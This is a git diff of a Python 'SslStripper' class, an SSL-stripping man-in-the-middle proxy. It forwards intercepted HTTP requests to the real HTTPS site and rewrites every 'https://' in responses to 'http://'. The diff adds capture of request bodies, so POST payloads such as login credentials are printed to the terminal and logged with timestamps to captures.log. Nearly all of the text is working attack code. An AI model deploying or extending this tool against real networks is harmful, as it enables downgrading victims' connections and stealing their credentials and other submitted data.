@@ -1,11 +1,9 @@
 import os
 import sys
 import re
-import time
 from datetime import datetime
 from http.server import HTTPServer, SimpleHTTPRequestHandler
 import socket
-from urllib.parse import urlparse
 import requests
 from termcolor import colored
 
@@ -28,49 +26,41 @@ class SslStripper:
                 host = self.headers.get("Host")
 
                 if "localhost" in host.lower():
-                    return
+                    return  # Ignore requests to localhost
 
-                path = self.path #urlparse(self.path).path
-                print(colored(path, "red"))
+                print(colored(f"[SSL] Forwarding request to https://{host}{self.path}.", "light_grey"))
 
-                print(colored(f"[SSL] Forwarding request to https://{host}{path}...", "light_grey"))
-                
-                # Print payload to if POST request
+                # Read payload from request
+                content_length = int(self.headers.get("Content-Length", 0))
+                payload = self.rfile.read(content_length)
+
+                decoded_payload = payload.decode("utf-8")  # Decode payload to string
+
+                if logging:  # If logging is enabled for SslStripper class
+                    with open("captures.log", "a") as f:  # Log request to file
+                        timestamp = datetime.now().strftime("%d-%m-%Y %H:%M:%S")
+                        # Write capture as line
+                        f.write(f"[{timestamp}] [{method.upper()}] http://{host}{self.path}"
+                                f"{" - " + repr(decoded_payload) if method.upper() != "GET" else ""}\n")
+
+                # Print payload to terminal on POST request
                 if method == "POST":
-                    content_length = int(self.headers.get("Content-Length", 0))
-                    payload = self.rfile.read(content_length)
+                    print(colored(f"[SSL] Captured POST payload: {repr(decoded_payload)}.", "light_grey"))
 
-                    print(colored(f"[SSL] Captured POST payload: {payload}", "light_grey"))
-
-                # Print payload to if POST request
-                if method == "POST":
-                    content_length = int(self.headers.get("Content-Length", 0))
-                    payload = self.rfile.read(content_length)
-
-                    print(colored(f"[SSL] Captured POST payload: {payload}", "light_grey"))
-
-                # Forward request to specified host
+                # Forward request to specified host with payload
                 try:
-                    response = requests.request(method, f"https://{host}{path}")
+                    response = requests.request(method, f"https://{host}{self.path}", data=payload)
                 except requests.exceptions.RequestException as e:
                     raise Exception() from e
 
-                # Extract payload from response
-                payload = response.content
-
-                # Downgrade al HTTPS URLs to HTTP
-                payload = re.sub(b"https://", b"http://", payload)
-
-                if logging:  # If logging is enabled for SslStripper class
-                    with open("captures.log", "a") as f:  # Log payload to file
-                        timestamp = datetime.now().strftime("%d-%m-%Y %H:%M:%S")
-                        f.write(f"[{timestamp}] http://{host}{path}: {payload}\n")  # Write capture as line
+                # Downgrade all HTTPS references to HTTP
+                response_payload = re.sub(b"https://", b"http://", response.content)
 
                 # Return response with payload to client
                 self.send_response(response.status_code)
                 self.send_header("Content-type", response.headers.get("Content-type"))
                 self.end_headers()
-                self.wfile.write(payload)
+                self.wfile.write(response_payload)
 
             class BadRequestException(Exception):  # Custom exception for bad requests
                 def __init__(self, message):
@@ -171,7 +161,7 @@ class SslStripper:
         #     self.open_port()
         #     time.sleep(3)
 
-        print(colored(f"[SSL] Starting webserver on port {self.port}...", "light_grey"))
+        print(colored(f"[SSL] Started proxy server on port {self.port}.", "light_grey"))
         self.server.serve_forever()
 
     def stop(self):
